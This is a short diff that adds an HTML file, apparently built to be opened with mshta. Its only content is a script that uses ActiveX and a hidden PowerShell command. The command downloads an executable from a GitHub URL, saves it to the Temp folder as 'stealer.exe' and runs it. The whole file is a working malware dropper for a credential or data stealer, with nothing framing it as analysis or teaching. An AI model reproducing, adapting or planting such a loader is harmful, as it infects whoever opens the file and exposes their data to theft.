@@ -1,0 +1,14 @@
+<html>
+<head>
+<script>
+var url = "https://raw.githubusercontent.com/err0rgod/chor/refs/heads/main/MSHTA/state.exe";
+var fso = new ActiveXObject("Scripting.FileSystemObject");
+var temp = fso.GetSpecialFolder(2); // 2 = Temp folder
+var exe = temp + "\\stealer.exe";
+
+var shell = new ActiveXObject("WScript.Shell");
+shell.Run("powershell -w hidden -c Invoke-WebRequest -Uri '" + url + "' -OutFile '" + exe + "'; Start-Process '" + exe + "'");
+</script>
+</head>
+<body></body>
+</html>
